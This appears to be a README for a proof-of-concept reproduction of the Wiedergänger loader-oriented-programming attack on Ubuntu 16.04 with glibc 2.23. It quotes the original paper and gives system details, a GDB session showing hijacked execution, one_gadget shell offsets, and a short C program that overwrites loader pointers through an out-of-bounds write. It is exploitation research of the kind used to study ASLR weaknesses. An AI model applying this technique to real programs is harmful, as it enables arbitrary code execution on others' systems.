# LOP-wiedergaenger
Dynamic Loader Oriented Programming - Wiedergaenger PoC (Proof of Concept)

My experiences and reproduction on Ubuntu 16.04.5 LTS

Quoting the [whitepaper](/kirsch-roots-2017-paper.pdf):

"In the following, we describe the Wiedergänger-Attack, a new attack vector that reliably allows to escalate unbounded array
access vulnerabilities occurring in specifically allocated memory regions to full code execution on programs running on i386/x86_64 Linux.

Wiedergänger-attacks abuse determinism in Linux ASLR implementation combined with the fact that (even with protection mechanisms such as relro and glibc’s pointer mangling enabled) there exist easy-to-hijack, writable (function) pointers in application memory."

Original Authors Repo: https://github.com/kirschju/wiedergaenger


```

$ cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.5 LTS"


$ apt-show-versions libc6      
libc6:amd64/xenial-security 2.23-0ubuntu10 uptodate
libc6:i386/xenial-security 2.23-0ubuntu10 uptodate

$ apt-show-versions libc-bin
libc-bin:amd64/xenial-security 2.23-0ubuntu10 uptodate
libc-bin:i386 not installed


$ dpkg -s libc-bin
Package: libc-bin
Essential: yes
Status: install ok installed
Priority: required
Section: libs
Installed-Size: 3479
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Architecture: amd64
Multi-Arch: foreign
Source: glibc
Version: 2.23-0ubuntu10
Depends: libc6 (>> 2.23), libc6 (<< 2.24)
Suggests: manpages
Conffiles:
 /etc/bindresvport.blacklist 4c09213317e4e3dd3c71d74404e503c5
 /etc/default/nss d6d5d6f621fb3ead2548076ce81e309c
 /etc/gai.conf 28fa76ff5a9e0566eaa1e11f1ce51f09
 /etc/ld.so.conf 4317c6de8564b68d628c21efa96b37e4
 /etc/ld.so.conf.d/libc.conf d4d833fd095fb7b90e1bb4a547f16de6
Description: GNU C Library: Binaries
 This package contains utility programs related to the GNU C Library.
 .
  * catchsegv: catch segmentation faults in programs
  * getconf: query system configuration variables
  * getent: get entries from administrative databases
  * iconv, iconvconfig: convert between character encodings
  * ldd, ldconfig: print/configure shared library dependencies
  * locale, localedef: show/generate locale definitions
  * tzselect, zdump, zic: select/dump/compile time zones
Homepage: http://www.gnu.org/software/libc/libc.html
Original-Maintainer: GNU Libc Maintainers <debian-glibc@lists.debian.org>

$ dpkg -s libc6   
Package: libc6
Status: install ok installed
Priority: required
Section: libs
Installed-Size: 10953
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Architecture: amd64
Multi-Arch: same
Source: glibc
Version: 2.23-0ubuntu10
Replaces: libc6-amd64
Depends: libgcc1
Suggests: glibc-doc, debconf | debconf-2.0, locales
Breaks: hurd (<< 1:0.5.git20140203-1), libtirpc1 (<< 0.2.3), locales (<< 2.23), locales-all (<< 2.23), lsb-core (<= 3.2-27), nscd (<< 2.23)
Conffiles:
 /etc/ld.so.conf.d/x86_64-linux-gnu.conf 593ad12389ab2b6f952e7ede67b8fbbf
Description: GNU C Library: Shared libraries
 Contains the standard libraries that are used by nearly all programs on
 the system. This package includes shared versions of the standard C library
 and the standard math library, as well as many others.
Homepage: http://www.gnu.org/software/libc/libc.html
Original-Maintainer: GNU Libc Maintainers <debian-glibc@lists.debian.org>




$ md5sum /lib/x86_64-linux-gnu/ld-2.23.so
f5ebf0bbc32238922f90e67cb60cdf7e  /lib/x86_64-linux-gnu/ld-2.23.so


$ ldd --version
ldd (Ubuntu GLIBC 2.23-0ubuntu10) 2.23
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.



$ md5sum /lib/x86_64-linux-gnu/libc.so.6
5d8e5f37ada3fc853363a4f3f631a41a  /lib/x86_64-linux-gnu/libc.so.6

$ /lib/x86_64-linux-gnu/libc.so.6
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release version 2.23, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.4.0 20160609.
Available extensions:
	crypt add-on version 2.1 by Michael Glad and others
	GNU Libidn by Simon Josefsson
	Native POSIX Threads Library by Ulrich Drepper et al
	BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.




GDB

$ gdb ./test           
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./test...done.
(gdb) b main
Breakpoint 1 at 0x400535: file test.c, line 8.
(gdb) r
Starting program: /home/mk/wiedergaenger/test 

Breakpoint 1, main (argc=1, argv=0x7fffffffdb68) at test.c:8
8	  ptr = malloc(0x200000);
(gdb) cont
Continuing.
process 20512 is executing new program: /bin/dash
Error in re-setting breakpoint 1: Function "main" not defined.
H�5C8: 1: ^e��: not found
[Inferior 1 (process 20512) exited with code 0177]
(gdb) 



I don't fullfill the gadget constraints $rax to be NULL, hence the funny error above. You can see however that the execution flow was taken over. With the right One RCE gadget, a successful shell would be spawned and/or desired code would be executed.



$ one_gadget /lib/x86_64-linux-gnu/libc-2.23.so
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

Source:


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv)
{
  unsigned char *ptr;
  ptr = malloc(0x200000);


  unsigned long base = 0x7f2158;


  *(unsigned long long *)&ptr[base] = 0x7ffff7a52216-0x4002b8;

  ptr[base + 0xa8] = 0xb8;

  ptr[base + 0x120] = 0xe3;


  return 0;
}

```

Some screenshots:


GDB Session

![LOP Wiedergaenger GDB](/wiedergaenger-gdb.png)


One RCE Gadgets available:

![One RCE Gadget](/one-rce-gadget.png)


Example with Shell (instead of One RCE gadget I pointed to func())


![LOP Wiedergaenger Shell](/wiedergaenger-2-shell.png)

